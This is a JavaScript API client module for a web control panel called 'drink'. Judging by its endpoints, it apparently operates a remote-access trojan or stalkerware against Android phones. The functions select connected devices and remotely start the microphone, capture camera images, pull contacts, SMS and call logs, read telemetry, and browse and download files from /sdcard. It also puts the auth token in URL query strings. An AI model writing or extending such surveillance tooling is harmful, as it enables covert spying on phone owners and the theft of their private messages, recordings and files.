import axios from "axios";

const TOKEN_KEY = "drink_auth_token";

export const getAuthToken = () => {
  return localStorage.getItem(TOKEN_KEY) || "";
};

export const setAuthToken = (token) => {
  if (token) {
    localStorage.setItem(TOKEN_KEY, token);
  } else {
    localStorage.removeItem(TOKEN_KEY);
  }
};

export const removeAuthToken = () => {
  localStorage.removeItem(TOKEN_KEY);
};

const apiClient = axios.create({
  baseURL: import.meta.env.VITE_API_URL || "/api",
  headers: {
    "Content-Type": "application/json",
  },
  timeout: 30000,
});

apiClient.interceptors.request.use((config) => {
  const token = getAuthToken();
  if (token) {
    config.headers.Authorization = `Bearer ${token}`;
  }
  return config;
});

apiClient.interceptors.response.use(
  (response) => response,
  (error) => {
    if (error.response && error.response.status === 401) {
      if (!error.config.url?.includes("/auth/login")) {
        removeAuthToken();
        window.dispatchEvent(new CustomEvent("drink:auth_required"));
      }
    }
    return Promise.reject(error);
  }
);

export const login = (username, password) =>
  apiClient.post("/auth/login", { username, password });

export const logout = async () => {
  try {
    await apiClient.post("/auth/logout");
  } catch (e) {
  } finally {
    removeAuthToken();
  }
};

export const verifyAuth = () => apiClient.get("/auth/verify");

export const getAuthenticatedUrl = (path, params = {}) => {
  const base = import.meta.env.VITE_API_URL || "/api";
  const search = new URLSearchParams();
  const token = getAuthToken();
  if (token) search.append("token", token);
  Object.entries(params).forEach(([k, v]) => {
    if (v !== undefined && v !== null) search.append(k, String(v));
  });
  const queryString = search.toString();
  const cleanPath = path.startsWith("/") ? path : `/${path}`;
  return `${base}${cleanPath}${queryString ? `?${queryString}` : ""}`;
};

export const getStatus = () => apiClient.get("/status");
export const getClients = () => apiClient.get("/clients");
export const selectClient = (clientId) => apiClient.post("/clients/select", { client_id: clientId });
export const disconnectClient = (clientId = null) => apiClient.post("/client/disconnect", clientId ? { client_id: clientId } : {});
export const disconnectSpecificClient = (clientId) => apiClient.post("/clients/disconnect", { client_id: clientId });
export const getLogs = () => apiClient.get("/logs");
export const clearLogs = () => apiClient.post("/logs/clear");
export const startServer = () => apiClient.post("/server/start");
export const stopServer = () => apiClient.post("/server/stop");
export const killServer = () => apiClient.post("/server/kill");
export const startMic = (clientId = null) => apiClient.post("/client/mic/start", clientId ? { client_id: clientId } : {});
export const stopMic = (clientId = null) => apiClient.post("/client/mic/stop", clientId ? { client_id: clientId } : {});
export const fetchContacts = (clientId = null) => apiClient.post("/client/contacts", clientId ? { client_id: clientId } : {});
export const getContactsList = () => apiClient.get("/contacts/list");
export const fetchSms = (hours = 24, clientId = null) => apiClient.post("/client/sms", { hours, ...(clientId ? { client_id: clientId } : {}) });
export const getLatestSms = () => apiClient.get("/sms/latest");
export const listCameras = (clientId = null) => apiClient.post("/client/cameras", clientId ? { client_id: clientId } : {});
export const captureCamera = (camId = "0", clientId = null) => apiClient.post("/client/camera/capture", { cam_id: camId, ...(clientId ? { client_id: clientId } : {}) });
export const fetchCallLogs = (hours = 24, clientId = null) => apiClient.post("/client/call_logs", { hours, ...(clientId ? { client_id: clientId } : {}) });
export const getLatestCallLogs = () => apiClient.get("/call_logs/latest");
export const fetchTelemetry = (clientId = null) => apiClient.post("/client/telemetry", clientId ? { client_id: clientId } : {});
export const getTelemetry = () => apiClient.get("/client/telemetry");
export const fetchFiles = (path = "/sdcard", clientId = null) => apiClient.post("/client/files", { path, ...(clientId ? { client_id: clientId } : {}) });
export const getFilesTree = (path = "/sdcard") => apiClient.get("/files/tree", { params: { path } });
export const downloadFile = (path, clientId = null) => apiClient.post("/client/file/download", { path, ...(clientId ? { client_id: clientId } : {}) });
export const getFileDownloadUrl = (path, clientId = null, name = null) => {
  return getAuthenticatedUrl("/file/download", { path, client_id: clientId, name });
};
export const clearAllData = () => apiClient.post("/data/clear");

export default apiClient;
